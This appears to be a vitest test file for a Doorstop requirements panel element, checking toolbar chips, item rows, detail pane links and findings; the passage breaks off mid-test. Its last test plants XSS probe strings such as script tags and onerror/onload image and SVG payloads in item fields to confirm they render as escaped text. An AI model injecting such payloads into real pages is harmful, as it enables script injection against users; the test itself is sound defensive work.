// @vitest-environment happy-dom
//
// Element-level tests for the integration chain E2 panel element
// (doorstop-panel-elements.ts), per plan §5: drive the controller directly
// (DOM-free state logic is covered by doorstop-panel.test.ts) and reserve
// these for template/event wiring — shadow-root content, toolbar chips,
// item-list rows, the detail pane, the action rows' exact terminal command
// strings, and the Ask-agent menu's prompt inserts.
//
// The controller host is the minimal mutable flag holder ({isConnected}).
// The body mirrors controller state into its reactive properties exactly
// like the panel render wiring does: `bindBody` below stands in for the host
// template's property bindings. The terminal is the real host surface the
// element reads at click time, so every action test asserts the exact
// `runCommand` input (title, command, metadata, open) and the completion
// path (TerminalCommandRunHandle.completed → invalidate).

import { afterEach, describe, expect, it, vi, type Mock } from "vitest";
import type { TerminalCommandRun, TerminalCommandRunHandle, Workspace, WorkspacePanelContext } from "@jmfederico/pi-web/plugin-api";
import type { DoorstopDocumentConfig, DoorstopIndex, ItemRecord, ItemStateKey } from "./doorstop-contract.js";
import type { DoorstopRunResponse } from "./doorstop-backend-contract.js";
import { buildDoorstopIndex } from "./doorstop-model.js";
import { computeItemStamp, computeItemStates } from "./doorstop-state.js";
import {
  DoorstopWorkspaceController,
  type DoorstopWorkspaceHost,
  type DoorstopWorkspaceJob,
} from "./doorstop-panel-controller.js";
import type { DoorstopWorkspaceResult } from "./doorstop-panel.js";
import { loadDoorstopWorkspace } from "./doorstop-panel.js";
import { DEFAULT_OPENDOOR_SETTINGS } from "./doorstop-settings.js";
import {
  draftChildRequirementPrompt,
  explainItemPrompt,
  fixSuspectLinksPrompt,
  reviewReadinessPrompt,
} from "./doorstop-prompts.js";
import {
  bodyElementTag,
  defineDoorstopPanelElements,
  documentStateDots,
  doorstopPublishCommand,
  doorstopPublishTarget,
  EMPTY_WORKSPACE_MESSAGE,
  FINDINGS_EMPTY_HINT,
  FINDINGS_EMPTY_MESSAGE,
  FINDINGS_PLUGIN_LOCAL_NOTE,
  filteredItems,
  findingsCountText,
  findingsViewCounts,
  findingsViewRows,
  shortFingerprint,
  STATE_CHIP_LABELS,
  stateChipKind,
  suspectParentItems,
  type DoorstopPanelBodyElement,
} from "./doorstop-panel-elements.js";
import {
  createFakeFiles,
  dirEntry,
  fileEntry,
  text,
  tree,
  type FakeWorkspaceFiles,
} from "./test-support.js";

const doorstopWorkspace: Workspace = {
  id: "workspace-1",
  projectId: "project-1",
  path: "/repo",
  label: "main",
  isMain: true,
};

/** Provider metadata variants for the Phase D dispatch tests: the opendoor
 *  provider enables the backend path, the git provider (the usual fallback
 *  owner) and a request-disabled opendoor provider force the terminal path. */
const opendoorProvider: Workspace["provider"] = {
  pluginId: "opendoor",
  capabilities: { request: true, remove: false },
};
const opendoorNoRequestProvider: Workspace["provider"] = {
  pluginId: "opendoor",
  capabilities: { request: false, remove: false },
};
const gitProvider: Workspace["provider"] = {
  pluginId: "git",
  capabilities: { request: true, remove: false },
};

/** Access to `window.confirm` for stubbing — happy-dom's Window does not
 *  implement confirm, so tests install a stub here and the afterEach removes
 *  it (the optional field tolerates the assignment under exactOptional). */
type WindowWithConfirm = { confirm?: (message?: string) => boolean };

function stubConfirm(result: boolean): Mock {
  const spy = vi.fn(() => result);
  (window as unknown as WindowWithConfirm).confirm = spy;
  return spy;
}

afterEach(() => {
  document.body.replaceChildren();
  // exactOptionalPropertyTypes forbids an explicit `undefined` write to an
  // optional field — deleting the stub restores the absent property.
  delete (window as unknown as WindowWithConfirm).confirm;
});

// --- small real-shape fixtures ---------------------------------------------------------

function makeDocument(overrides: Partial<DoorstopDocumentConfig> = {}): DoorstopDocumentConfig {
  return {
    directoryPath: overrides.directoryPath ?? "reqs",
    configPath: overrides.configPath ?? "reqs/.doorstop.yml",
    prefix: overrides.prefix ?? "REQ",
    digits: overrides.digits ?? 4,
    separator: overrides.separator ?? "",
    itemformat: overrides.itemformat ?? "yaml",
    extra: overrides.extra ?? {},
    ...(overrides.parentPrefix === undefined ? {} : { parentPrefix: overrides.parentPrefix }),
  };
}

function makeItem(uid: string, documentPrefix: string, overrides: Partial<ItemRecord> = {}): ItemRecord {
  return {
    uid,
    documentPrefix,
    path: overrides.path ?? `${uid}.yml`,
    level: overrides.level ?? "1.0",
    active: overrides.active ?? true,
    derived: overrides.derived ?? false,
    normative: overrides.normative ?? true,
    text: overrides.text ?? "",
    ref: overrides.ref ?? "",
    links: overrides.links ?? [],
    reviewed: overrides.reviewed ?? null,
    attributes: overrides.attributes ?? {},
    raw: overrides.raw ?? {},
    stateKeys: overrides.stateKeys ?? [],
    ...(overrides.header === undefined ? {} : { header: overrides.header }),
    ...(overrides.references === undefined ? {} : { references: overrides.references }),
  };
}

function makeResult(
  items: ItemRecord[],
  documents: DoorstopDocumentConfig[],
  diagnostics: DoorstopIndex["diagnostics"] = [],
  knownFilePaths: ReadonlySet<string> = new Set(),
): DoorstopWorkspaceResult {
  const index = buildDoorstopIndex(documents, items, diagnostics, knownFilePaths);
  computeItemStates(index);
  return { index, settings: DEFAULT_OPENDOOR_SETTINGS };
}

/** The standard tree the panel tests render: REQ ← [TST], with one suspect
 *  link (REQ0002 → REQ0001 recorded against a stale stamp), one reviewed
 *  item (REQ0001), one clean child link (TST002 → REQ0001 with the current
 *  link-record stamp), and a missing reference (docs/gone.md). */
function makeTreeResult(): DoorstopWorkspaceResult {
  const reqConfig = makeDocument({ directoryPath: "reqs", configPath: "reqs/.doorstop.yml", prefix: "REQ", digits: 4 });
  const tstConfig = makeDocument({
    directoryPath: "tests",
    configPath: "tests/.doorstop.yml",
    prefix: "TST",
    digits: 3,
    parentPrefix: "REQ",
  });
  const req0001 = makeItem("REQ0001", "REQ", {
    path: "reqs/REQ0001.yml",
    level: "1.0",
    text: "The system shall do X.",
  });
  // REQ0001 was reviewed against its current fingerprint.
  req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
  // TST002 records the CURRENT link-record stamp of REQ0001 → ok link.
  const parentStamp = computeItemStamp(req0001, reqConfig, false);
  const req0002 = makeItem("REQ0002", "REQ", {
    path: "reqs/REQ0002.yml",
    level: "1.1",
    header: "Capacity allocation",
    text: "The system shall do Y.",
    ref: "docs/spec.md",
    references: [{ type: "file", path: "docs/gone.md" }],
    links: [{ uid: "REQ0001", fingerprint: "STALE-stamp-0123456789" }],
    attributes: { owner: "team-a", priority: 2 },
  });
  const tst001 = makeItem("TST001", "TST", {
    path: "tests/TST001.yml",
    level: "1.0",
    text: "Verify X.",
  });
  const tst002 = makeItem("TST002", "TST", {
    path: "tests/TST002.yml",
    level: "1.1",
    text: "Verify X end-to-end.",
    links: [{ uid: "REQ0001", fingerprint: parentStamp }],
  });
  const knownFilePaths = new Set([
    "reqs/REQ0001.yml",
    "reqs/REQ0002.yml",
    "tests/TST001.yml",
    "tests/TST002.yml",
    "docs/spec.md",
  ]);
  return makeResult([req0001, req0002, tst001, tst002], [reqConfig, tstConfig], [], knownFilePaths);
}

/** Mount the body element over a controller driven by the given job, mirror
 *  the controller state onto it, and settle the first load. The bound context
 *  is the one returned, so action tests can assert on its spies exactly as
 *  the element used them. */
async function mountBody(
  job: DoorstopWorkspaceJob,
  hook: {
    insertText?: Mock;
    focusPrompt?: Mock;
    runCommand?: Mock;
    backend?: Mock;
    provider?: Workspace["provider"];
  } = {},
): Promise<{ body: DoorstopPanelBodyElement; controller: DoorstopWorkspaceController; context: ReturnType<typeof panelContext>["context"] }> {
  defineDoorstopPanelElements();
  const created = panelContext(hook);
  const controller = new DoorstopWorkspaceController({ isConnected: false }, created.context, job);
  const body = document.createElement(bodyElementTag) as DoorstopPanelBodyElement;
  bindBody(body, controller, created.context);
  document.body.append(body);
  await body.updateComplete;
  await settle();
  bindBody(body, controller, created.context);
  await flush(body);
  return { body, controller, context: created.context };
}

// --- pure helpers ----------------------------------------------------------------------

describe("stateChipKind and STATE_CHIP_LABELS (chip color + label mapping)", () => {
  it("maps every ItemStateKey to a label and a color kind", () => {
    expect(Object.keys(STATE_CHIP_LABELS).sort()).toEqual(
      [
        "normative",
        "non-normative",
        "inactive",
        "reviewed",
        "unreviewed",
        "suspect-link",
        "no-child-links",
        "no-links",
        "unknown-link",
        "missing-reference",
      ].sort(),
    );
    // informational → muted
    expect(stateChipKind("normative")).toBe("muted");
    expect(stateChipKind("non-normative")).toBe("muted");
    expect(stateChipKind("reviewed")).toBe("muted");
    // warn-ish → warning
    expect(stateChipKind("unreviewed")).toBe("warning");
    expect(stateChipKind("no-child-links")).toBe("warning");
    expect(stateChipKind("no-links")).toBe("warning");
    // error-ish → danger
    expect(stateChipKind("inactive")).toBe("danger");
    expect(stateChipKind("suspect-link")).toBe("danger");
    expect(stateChipKind("unknown-link")).toBe("danger");
    expect(stateChipKind("missing-reference")).toBe("danger");
  });
});

describe("documentStateDots (aggregate document state)", () => {
  const doc = makeDocument({ prefix: "REQ" });

  it("returns [] for a document with no items", () => {
    expect(documentStateDots(doc, [])).toEqual([]);
  });

  it("returns a green ok dot when every item is reviewed with no suspect links", () => {
    const item = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "reviewed"] });
    expect(documentStateDots(doc, [item])).toEqual(["ok"]);
  });

  it("adds an amber dot when any item is unreviewed", () => {
    const item = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "unreviewed"] });
    expect(documentStateDots(doc, [item])).toEqual(["unreviewed"]);
  });

  it("adds a red dot when any item has a suspect link (amber kept)", () => {
    const clean = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "reviewed"] });
    const suspect = makeItem("REQ0002", "REQ", { stateKeys: ["normative", "unreviewed", "suspect-link"] });
    expect(documentStateDots(doc, [clean, suspect])).toEqual(["unreviewed", "suspect"]);
  });
});

describe("suspectParentItems and filteredItems (pure selection helpers)", () => {
  it("resolves the changed parents of a suspect link, matching the state chain", () => {
    const result = makeTreeResult();
    const req0002 = result.index.byUid.get("REQ0002");
    const req0001 = result.index.byUid.get("REQ0001");
    if (req0002 === undefined || req0001 === undefined) throw new Error("fixture");
    expect(req0002.stateKeys).toContain("suspect-link");
    expect(suspectParentItems(req0002, result.index).map((parent) => parent.uid)).toEqual(["REQ0001"]);
    // TST002 recorded the current stamp → not suspect.
    const tst002 = result.index.byUid.get("TST002");
    if (tst002 === undefined) throw new Error("fixture");
    expect(tst002.stateKeys).not.toContain("suspect-link");
    expect(suspectParentItems(tst002, result.index)).toEqual([]);
  });

  it("filters by document prefix, state key, and search over uid/header/text", () => {
    const result = makeTreeResult();
    const index = result.index;
    expect(index.items).toHaveLength(4);

    expect(filteredItems(index, "REQ", undefined, "").map((item) => item.uid)).toEqual(["REQ0001", "REQ0002"]);
    expect(filteredItems(index, undefined, undefined, "").map((item) => item.uid)).toEqual([
      "REQ0001",
      "TST001",
      "REQ0002",
      "TST002",
    ]);
    expect(filteredItems(index, undefined, "suspect-link", "").map((item) => item.uid)).toEqual(["REQ0002"]);
    expect(filteredItems(index, undefined, "reviewed", "").map((item) => item.uid)).toEqual(["REQ0001"]);
    // The empty string sentinel (the "All" chip's selectDocument("")) means all.
    expect(filteredItems(index, "", undefined, "").map((item) => item.uid)).toHaveLength(4);
    // Search over UID, header, and text.
    expect(filteredItems(index, undefined, undefined, "REQ0002").map((item) => item.uid)).toEqual(["REQ0002"]);
    expect(filteredItems(index, undefined, undefined, "capacity").map((item) => item.uid)).toEqual(["REQ0002"]);
    expect(filteredItems(index, undefined, undefined, "verify").map((item) => item.uid)).toEqual(["TST001", "TST002"]);
    expect(filteredItems(index, undefined, undefined, "nope")).toEqual([]);
  });
});

// --- element tests ----------------------------------------------------------------------

describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)", () => {
  it("renders the empty state with the doorstop create hint when no documents exist", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeResult([], [])));
    expect(controller.result?.index.documents).toHaveLength(0);

    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    const empty = root.querySelector(".doorstop-empty");
    expect(empty?.textContent).toContain("doorstop create REQ ./reqs");
    expect(empty?.textContent).toContain(EMPTY_WORKSPACE_MESSAGE);
    // The toolbar still offers a lone "All" chip.
    expect(root.querySelectorAll(".doorstop-doc-chip")).toHaveLength(1);
    expect(root.querySelector(".doorstop-doc-prefix")?.textContent).toBe("All");
  });

  it("renders loading copy before a result lands and an error alert afterwards", async () => {
    let resolveJob: ((result: DoorstopWorkspaceResult) => void) | undefined;
    const job: DoorstopWorkspaceJob = () =>
      new Promise<DoorstopWorkspaceResult>((resolve) => {
        resolveJob = resolve;
      });
    const { body, controller, context } = await mountBody(job);
    // No result yet: the loading copy is visible.
    expect(body.shadowRoot?.textContent).toContain("Loading workspace…");

    // A rejected load surfaces as the attributed error alert.
    resolveJob?.(makeResult([], []));
    await settle();
    controller.error = "Workspace read failed: EACCES";
    bindBody(body, controller, context);
    await flush(body);
    const alert = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-error[role=alert]");
    expect(alert?.textContent).toBe("Workspace read failed: EACCES");
  });

  it("renders the stale notice as a button that rescans, and clears it", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    controller.stale = true;
    bindBody(body, controller, context);
    await flush(body);
    const stale = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-stale");
    expect(stale?.textContent).toBe("stale — refresh");
    // The stale notice is a button: clicking it rescans the workspace.
    const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());
    stale?.click();
    await settle();
    expect(invalidate).toHaveBeenCalledTimes(1);

    controller.stale = false;
    bindBody(body, controller, context);
    await flush(body);
    expect(body.shadowRoot?.querySelector(".doorstop-stale")).toBeNull();
  });

  it("renders the document tree chips with counts + dots; clicks filter the list; All clears it", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // REQ has a reviewed item + an unreviewed suspect item; TST two unreviewed items.
    const chips = [...root.querySelectorAll<HTMLElement>(".doorstop-doc-chip")];
    expect(chips.map((chip) => chip.querySelector(".doorstop-doc-prefix")?.textContent)).toEqual(["All", "REQ", "TST"]);
    const reqChip = chips[1];
    const tstChip = chips[2];
    if (reqChip === undefined || tstChip === undefined) throw new Error("chips");
    expect(reqChip.textContent).toContain("REQ");
    expect(reqChip.textContent).toContain("2");
    expect(tstChip.textContent).toContain("← REQ"); // tree edge from config.parent
    expect(tstChip.textContent).toContain("TST");
    // Dots: REQ → unreviewed + suspect; TST → unreviewed.
    expect([...reqChip.querySelectorAll(".doorstop-dot")].map((dot) => dot.className)).toEqual([
      "doorstop-dot doorstop-dot-unreviewed",
      "doorstop-dot doorstop-dot-suspect",
    ]);
    expect([...tstChip.querySelectorAll(".doorstop-dot")].map((dot) => dot.className)).toEqual([
      "doorstop-dot doorstop-dot-unreviewed",
    ]);

    // All items are listed before any filter.
    expect(root.querySelectorAll(".doorstop-item-row")).toHaveLength(4);

    // Clicking the REQ chip filters the list to REQ items.
    reqChip.click();
    expect(controller.selectedDocumentPrefix).toBe("REQ");
    bindBody(body, controller, context);
    await flush(body);
    const uidCells = [...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent);
    expect(uidCells).toEqual(["REQ0001", "REQ0002"]);

    // The "All" chip clears the document filter.
    const allChip = root.querySelector<HTMLElement>('.doorstop-doc-chip[data-prefix=""]');
    allChip?.click();
    expect(controller.selectedDocumentPrefix).toBe("");
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelectorAll(".doorstop-item-row")).toHaveLength(4);
  });

  it("surfaces diagnostics (truncated/binary/parse) as an inline warning strip", async () => {
    const { body } = await mountBody(() =>
      Promise.resolve(
        makeResult(
          [],
          [makeDocument()],
          [
            { severity: "error", path: "reqs/REQ0001.yml", message: "invalid contents: reqs/REQ0001.yml: YAML error" },
            { severity: "warning", path: "reqs/REQ0002.yml", message: "File content truncated by the workspace API and skipped" },
          ],
        ),
      ),
    );
    const root = body.shadowRoot;
    const strip = root?.querySelector(".doorstop-diagnostics");
    expect(strip?.textContent).toContain("invalid contents: reqs/REQ0001.yml: YAML error");
    expect(strip?.textContent).toContain("truncated by the workspace API");
    expect(strip?.textContent).toContain("reqs/REQ0001.yml");
    expect(strip?.querySelector(".doorstop-diagnostic.doorstop-error")).not.toBeNull();
    expect(strip?.querySelector(".doorstop-diagnostic.doorstop-warning")).not.toBeNull();
  });

  it("renders the diagnostics strip inside the stacked list, above the items, within the split", async () => {
    const reqConfig = makeDocument({ directoryPath: "reqs", configPath: "reqs/.doorstop.yml", prefix: "REQ", digits: 4 });
    const item = makeItem("REQ0001", "REQ", { path: "reqs/REQ0001.yml", level: "1.0", text: "The system shall do X." });
    const { body } = await mountBody(() =>
      Promise.resolve(
        makeResult(
          [item],
          [reqConfig],
          [{ severity: "warning", path: "reqs/REQ0001.yml", message: "binary file skipped" }],
          new Set(["reqs/REQ0001.yml"]),
        ),
      ),
    );
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Stacked order (list above, detail below): the list pane precedes the
    // detail pane as direct children of the split.
    const split = root.querySelector(".doorstop-split");
    const list = split?.querySelector(".doorstop-list");
    const detailPane = split?.querySelector(".doorstop-detail-pane");
    expect(split).not.toBeNull();
    if (split == null || list == null || detailPane == null) throw new Error("panes");
    const splitChildren = [...split.children];
    expect(splitChildren.indexOf(list)).toBeLessThan(splitChildren.indexOf(detailPane));

    // The strip renders inside the scrolling list, above the items.
    const strip = list.querySelector(".doorstop-diagnostics");
    const items = list.querySelector(".doorstop-items");
    expect(strip).not.toBeNull();
    expect(items).not.toBeNull();
    if (strip == null || items == null) throw new Error("strip/items");
    const listChildren = [...list.children];
    expect(listChildren.indexOf(strip)).toBeGreaterThan(-1);
    expect(listChildren.indexOf(items)).toBeGreaterThan(-1);
    expect(listChildren.indexOf(strip)).toBeLessThan(listChildren.indexOf(items));
  });

  it("still renders the diagnostics strip when the workspace has diagnostics but zero documents", async () => {
    const { body } = await mountBody(() =>
      Promise.resolve(
        makeResult([], [], [
          { severity: "error", path: "reqs/REQ0001.yml", message: "invalid contents: reqs/REQ0001.yml: YAML error" },
        ]),
      ),
    );
    const root = body.shadowRoot;
    // The strip must not be silently dropped just because no document parsed
    // (the exact case the strip exists for): it renders above the empty state.
    const strip = root?.querySelector(".doorstop-diagnostics");
    expect(strip).not.toBeNull();
    expect(strip?.textContent).toContain("YAML error");
    expect(strip?.textContent).toContain("reqs/REQ0001.yml");
    expect(root?.querySelector(".doorstop-empty")?.textContent).toContain(EMPTY_WORKSPACE_MESSAGE);
  });
});

describe("DoorstopPanelBodyElement (item list + selection)", () => {
  it("renders level-ordered rows with state chips per ItemStateKey and selects on click", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    const rows = [...root.querySelectorAll<HTMLElement>(".doorstop-item-row")];
    expect(rows).toHaveLength(4);

    // REQ0002 row: level, uid, header excerpt, and its chip set with the
    // distinct color classes (muted normative, warning unreviewed, danger
    // suspect link).
    const req0002Row = root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]');
    if (req0002Row === null) throw new Error("row");
    expect(req0002Row.querySelector(".doorstop-item-level")?.textContent).toBe("1.1");
    expect(req0002Row.querySelector(".doorstop-item-uid")?.textContent).toBe("REQ0002");
    expect(req0002Row.querySelector(".doorstop-item-summary")?.textContent).toBe("Capacity allocation");
    const chips = [...req0002Row.querySelectorAll(".doorstop-chip")];
    // unreviewed/suspect/no-child-links/missing-reference all apply here: the
    // full chip set exercises every color kind (muted/warning/danger).
    expect(chips.map((chip) => chip.textContent)).toEqual([
      "normative",
      "unreviewed",
      "suspect link",
      "no child links",
      "missing reference",
    ]);
    expect(chips[0]?.className).toBe("doorstop-chip doorstop-chip-muted");
    expect(chips[1]?.className).toBe("doorstop-chip doorstop-chip-warning");
    expect(chips[2]?.className).toBe("doorstop-chip doorstop-chip-danger");
    expect(chips[3]?.className).toBe("doorstop-chip doorstop-chip-warning");
    expect(chips[4]?.className).toBe("doorstop-chip doorstop-chip-danger");

    // TST001: normative + unreviewed + no-links (warning).
    const tst001Row = root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]');
    const tstChips = [...(tst001Row?.querySelectorAll(".doorstop-chip") ?? [])].map(
      (chip) => `${chip.textContent}:${chip.className}`,
    );
    expect(tstChips).toEqual([
      "normative:doorstop-chip doorstop-chip-muted",
      "unreviewed:doorstop-chip doorstop-chip-warning",
      "no links:doorstop-chip doorstop-chip-warning",
    ]);

    // Clicking a row selects the item and the detail pane renders it.
    req0002Row.click();
    expect(controller.selectedUid).toBe("REQ0002");
    bindBody(body, controller, context);
    await flush(body);
    const detail = root.querySelector(".doorstop-detail");
    expect(detail?.textContent).toContain("REQ0002");
    expect(detail?.textContent).toContain("level 1.1");
    expect(detail?.textContent).toContain("Capacity allocation");
    expect(detail?.textContent).toContain("The system shall do Y.");
    // Flags render as active/normative/non-derived (interpolations sit on
    // their own template lines, so textContent carries surrounding
    // whitespace — trim for the comparison).
    const flags = [...(detail?.querySelectorAll(".doorstop-flag") ?? [])].map((flag) => flag.textContent?.trim());
    expect(flags).toEqual(["active", "normative", "non-derived"]);
  });

  it("filters the list through the state dropdown and the search input", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    const select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
    if (select === null) throw new Error("select");
    select.value = "suspect-link";
    select.dispatchEvent(new Event("change"));
    expect(controller.stateFilter).toBe("suspect-link");
    bindBody(body, controller, context);
    await flush(body);
    expect([...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent)).toEqual(["REQ0002"]);

    // Back to All states, then search over text ("verify" → the TST items).
    select.value = "";
    select.dispatchEvent(new Event("change"));
    expect(controller.stateFilter).toBeUndefined();
    const search = root.querySelector<HTMLInputElement>(".doorstop-search");
    if (search === null) throw new Error("search");
    search.value = "verify";
    search.dispatchEvent(new Event("input"));
    expect(controller.search).toBe("verify");
    bindBody(body, controller, context);
    await flush(body);
    expect([...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent)).toEqual(["TST001", "TST002"]);

    // A filter with no matches renders the muted no-match copy.
    search.value = "zzz";
    search.dispatchEvent(new Event("input"));
    bindBody(body, controller, context);
    await flush(body);
    expect(root.textContent).toContain("No items match the current document, state, or search filters.");
  });

  it("shows the no-item copy when a document has items but none parse", async () => {
    const { body } = await mountBody(() => Promise.resolve(makeResult([], [makeDocument()])));
    expect(body.shadowRoot?.textContent).toContain("No Doorstop items found");
  });
});

describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, findings)", () => {
  it("shows suspect links with recorded vs current fingerprint shorts and navigates on click", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    const row = root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]');
    row?.click();
    bindBody(body, controller, context);
    await flush(body);

    const linksOut = root.querySelector('.doorstop-detail [aria-label="Parent links"]');
    expect(linksOut?.textContent).toContain("REQ0001");
    expect(linksOut?.textContent).toContain("suspect");
    expect(linksOut?.textContent).toContain("recorded STALE-st…");
    // The current fingerprint short form is the real stamp's prefix.
    const req0001 = controller.result?.index.byUid.get("REQ0001");
    const currentShort = shortFingerprint(req0001 === undefined ? null : computeItemStamp(req0001, makeDocument({ prefix: "REQ" }), false));
    expect(linksOut?.textContent).toContain(`current ${currentShort}`);

    // Clicking the link row navigates to the parent.
    const linkRow = root.querySelector<HTMLElement>('.doorstop-link-row[data-uid="REQ0001"]');
    linkRow?.click();
    expect(controller.selectedUid).toBe("REQ0001");
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector(".doorstop-detail")?.textContent).toContain("REQ0001");
    expect(root.querySelector(".doorstop-detail")?.textContent).toContain("The system shall do X.");
  });

  it("shows a clean child link (ok verdict, matching shorts) and the links-in list", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    // Select TST002 (its link to REQ0001 is recorded with the current stamp).
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector('[aria-label="Parent links"]')?.textContent).toContain("ok");

    // Select REQ0001: TST002 shows up as a child link, clickable.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    const linksIn = root.querySelector('[aria-label="Child links"]');
    expect(linksIn?.textContent).toContain("TST002");
    root.querySelector<HTMLElement>('[aria-label="Child links"] .doorstop-link-row[data-uid="TST002"]')?.click();
    expect(controller.selectedUid).toBe("TST002");
  });

  it("renders references with a not-found chip and extended attributes as JSON-ish text", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const references = root.querySelector('[aria-label="File references"]');
    expect(references?.textContent).toContain("docs/spec.md");
    expect(references?.textContent).toContain("docs/gone.md");
    expect(references?.textContent).toContain("not found");
    // The found reference renders no "not found" chip.
    const foundRef = [...(references?.querySelectorAll(".doorstop-link-row") ?? [])].find((entry) =>
      entry.textContent?.includes("docs/spec.md"),
    );
    expect(foundRef?.querySelector(".doorstop-chip")).toBeNull();
    const missingRef = [...(references?.querySelectorAll(".doorstop-link-row") ?? [])].find((entry) =>
      entry.textContent?.includes("docs/gone.md"),
    );
    expect(missingRef?.querySelector(".doorstop-chip")?.textContent).toBe("not found");

    // Extended attributes render as JSON-ish text (quoted strings, numbers).
    const attributeRows = [...(root.querySelectorAll(".doorstop-attribute") ?? [])];
    expect(attributeRows.map((row) => row.textContent)).toEqual(['owner"team-a"', 'priority2']);
    // The raw value never appears as markup (see also the injection test).
    for (const row of attributeRows) expect(row.querySelector("img")).toBeNull();
  });

  it("renders the item's local findings with severities", async () => {
    const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
    bindBody(body, controller, context);
    await flush(body);

    const findings = root.querySelector('[aria-label="Findings for this item"]');
    expect(findings?.textContent).toContain("suspect link: REQ0001");
    expect(findings?.textContent).toContain("no links from child document: TST");
    // reviewed is null → the state chain's info finding, not the warning.
    expect(findings?.textContent).toContain("needs initial review");
    expect(findings?.textContent).toContain("external reference not found: docs/gone.md");
    expect(findings?.querySelector(".doorstop-finding.doorstop-error")).not.toBeNull();
    expect(findings?.querySelector(".doorstop-finding.doorstop-warning")).not.toBeNull();
    expect(findings?.querySelector(".doorstop-finding.doorstop-info")).not.toBeNull();
    // The reviewed REQ0001 has no findings at all → the muted no-findings copy.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    expect(root.querySelector(".doorstop-detail")?.textContent).toContain("No local findings for this item.");
  });

  it("never injects raw HTML from text, header, attributes, uid, link UIDs, or diagnostics", async () => {
    const evil = makeItem("REQ0001", "REQ", {
      text: "<script>alert(1)</script>",
      header: "<b>bold</b>",
      attributes: { payload: "<img src=x onerror=alert(2)>" },
      links: [{ uid: "<img src=x onerror=alert(3)>", fingerprint: "STALE" }],
    });
    // A hostile uid must render as escaped text in both the list row and the
    // detail head (it is a distinct, non-colliding item).
    const evilUid = makeItem("<svg onload=alert(4)>", "REQ", { text: "has a hostile uid" });
    const diagnostics: DoorstopIndex["diagnostics"] = [
      { severity: "warning", path: "reqs/<b>diag</b>.yml", message: "truncated <img src=x onerror=alert(5)>" },
    ];
    const { body, controller, context } = await mountBody(() =>
      Promise.resolve(makeResult([evil, evilUid], [makeDocument()], diagnostics)),
    );
    const root = body.shadowRoot;
    if (root === null) throw new Error("shadow root");

    // Diagnostic path + message render as escaped literal text, never markup.
    const diag = root.querySelector(".doorstop-diagnostic");
    expect(diag?.textContent).toContain("reqs/<b>diag</b>.yml");
    expect(diag?.textContent).toContain("truncated <img src=x onerror=alert(5)>");
    expect(root.querySelector(".doorstop-diagnostic img")).toBeNull();

    // The hostile uid renders escaped in the item-list row's uid cell.
    const evilUidRow = root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="<svg onload=alert(4)>"]');
    expect(evilUidRow?.querySelector(".doorstop-item-uid")?.textContent).toBe("<svg onload=alert(4)>");
    expect(root.querySelector(".doorstop-item-row svg")).toBeNull();

    // Selecting the hostile-uid item pins the detail-head uid as escaped text.
    evilUidRow?.click();
    bindBody(body, controller, context);
    await flush(body);
    const detail = root.querySelector(".doorstop-detail");
    if (detail === null) throw new Error("detail");
    expect(detail.querySelector(".doorstop-detail-uid")?.textContent).toBe("<svg onload=alert(4)>");
    expect(detail.querySelector("svg")).toBeNull();

    // Selecting the evil item: text/header/attribute + the link's hostile uid
    // all escape to literal text.
    root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
    bindBody(body, controller, context);
    await flush(body);
    const detail2 = root.querySelector(".doorstop-detail");
    if (detail2 === null) throw new Error("detail2");
    expect(detail2.textContent).toContain("<script>alert(1)</script>");
    expect(detail2.textContent).toContain("<b>bold</b>");
    expect(detail2.textContent).toContain("<img src=x onerror=alert(2)>");
    const linksOut = root.querySelector('[aria-label="Parent links"]');
